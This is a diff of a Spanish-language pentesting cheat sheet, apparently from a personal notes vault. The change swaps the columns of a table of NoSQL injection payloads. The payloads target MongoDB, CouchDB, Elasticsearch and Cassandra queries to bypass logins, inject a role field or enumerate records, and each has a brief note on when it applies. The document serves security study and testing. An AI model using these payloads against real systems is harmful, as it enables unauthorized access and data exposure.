@@ -22,15 +22,15 @@ linked:
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|---|
-| **MongoDB shell string** | `admin' \|\| '1'=='1` | Escape de string + OR siempre true. Si app concatena a shell. |
-| **MongoDB JS function** | `admin'); return true; //` | Cierre del string + retorno forzado + comment. |
-| **JSON injection (break quote)** | `admin","role":"admin","x":"` | Rompe JSON + inyecta field extra si parser permisivo. |
-| **Null byte truncate** | `admin ` | Trunca string en drivers legacy. |
-| **Array en lugar de string** | `user[]=admin&user[]=guest` | Backend puede castear array → lookup múltiple. |
-| **Injection en query ops** | `{"$where":"this.user=='" + input + "'"}` → `' \|\| 1==1 \|\| '` | Classic SQLi-style en `$where`. |
-| **CouchDB view injection** | `key="admin"&startkey=" "&endkey="￰"` | Lista todos si endpoint acepta rangos. |
-| **ElasticSearch query string** | `username:* OR role:admin` | Query DSL abierta → enum. |
-| **Cassandra CQL-like** | `admin' OR 1=1 --` | CQL tiene SQLi-like syntax (semi-relacional). |
+| `admin' \|\| '1'=='1` | **MongoDB shell string** | Escape de string + OR siempre true. Si app concatena a shell. |
+| `admin'); return true; //` | **MongoDB JS function** | Cierre del string + retorno forzado + comment. |
+| `admin","role":"admin","x":"` | **JSON injection (break quote)** | Rompe JSON + inyecta field extra si parser permisivo. |
+| `admin ` | **Null byte truncate** | Trunca string en drivers legacy. |
+| `user[]=admin&user[]=guest` | **Array en lugar de string** | Backend puede castear array → lookup múltiple. |
+| `{"$where":"this.user=='" + input + "'"}` → `' \|\| 1==1 \|\| '` | **Injection en query ops** | Classic SQLi-style en `$where`. |
+| `key="admin"&startkey=" "&endkey="￰"` | **CouchDB view injection** | Lista todos si endpoint acepta rangos. |
+| `username:* OR role:admin` | **ElasticSearch query string** | Query DSL abierta → enum. |
+| `admin' OR 1=1 --` | **Cassandra CQL-like** | CQL tiene SQLi-like syntax (semi-relacional). |
 ^nosqli-syntax
 
 ---
